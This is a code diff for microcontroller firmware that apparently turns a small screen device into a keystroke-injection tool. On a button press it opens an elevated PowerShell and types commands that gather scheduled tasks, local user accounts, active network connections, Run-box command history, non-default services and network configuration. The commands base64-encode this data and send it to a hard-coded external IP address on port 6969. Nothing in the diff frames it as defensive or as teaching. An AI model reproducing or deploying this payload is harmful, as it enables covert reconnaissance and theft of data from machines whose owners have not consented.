@@ -46,7 +46,7 @@ void buttonLoop() {
   display.setCursor(95 - display.getPrintWidth("Pressed!"), 0);
   if (display.getButtons(TSButtonUpperRight)) {
     display.println("Pressed!");
-    command("linux");
+    linux_command("linux");
   } else {
     display.println("Linux");
   }
@@ -96,42 +96,70 @@ void windows_command(char arg1[]){
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.releaseAll();
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/init/$(hostname);iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/scheduled_tasks/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,TaskPath | ConvertTo-Json))));")
+  delay(1000);
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/init/$(hostname);iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/scheduled_tasks/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,TaskPath | ConvertTo-Json))));");
   delay(1000);
 
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/scheduled_tasks/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,TaskPath | ConvertTo-Json))));iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/user_accounts/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-LocalUser | ConvertTo-Json))));")
+  delay(1000);
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/scheduled_tasks/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,TaskPath | ConvertTo-Json))));iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/user_accounts/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-LocalUser | ConvertTo-Json))));");
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/active_connections/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-NetTCPConnection -State Established | ConvertTo-Json))));")
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/active_connections/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-NetTCPConnection -State Established | ConvertTo-Json))));");
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
+  delay(1000);
 
   Keyboard.releaseAll();
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/command_history/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU | ConvertTo-Json))));")
+  delay(1000);
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/command_history/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU | ConvertTo-Json))));");
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-
+  delay(1000);
   Keyboard.releaseAll();
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/nondefault_services/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-Service | ?{$_.DisplayName -notlike "*Microsoft*" -and $_.DisplayName -notlike "*Windows*"} | ConvertTo-Json))));")
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/nondefault_services/slatt -Headers @{'Content-Type' = 'application/json'} -Method POST -Body $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(Get-Service | ?{$_.DisplayName -notlike 'Microsoft' -and $_.DisplayName -notlike 'Windows'} | ConvertTo-Json))));");
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-
-  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/network_config/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(ipconfig | ConvertTo-Json))));")
+  delay(1000);
+  Keyboard.print("iwr http://35.212.247.53:6969/api/windows/upd/$(hostname)/network_config/$([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($(ipconfig | ConvertTo-Json))));");
   delay(1000);
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-
+  delay(1000);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+}
+
+void linux_command(char arg1[]){
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(500);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("powershell");
+  delay(1000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("test");
+  delay(1000);
 }
 
 void loop() {
   readInput();
 }
+
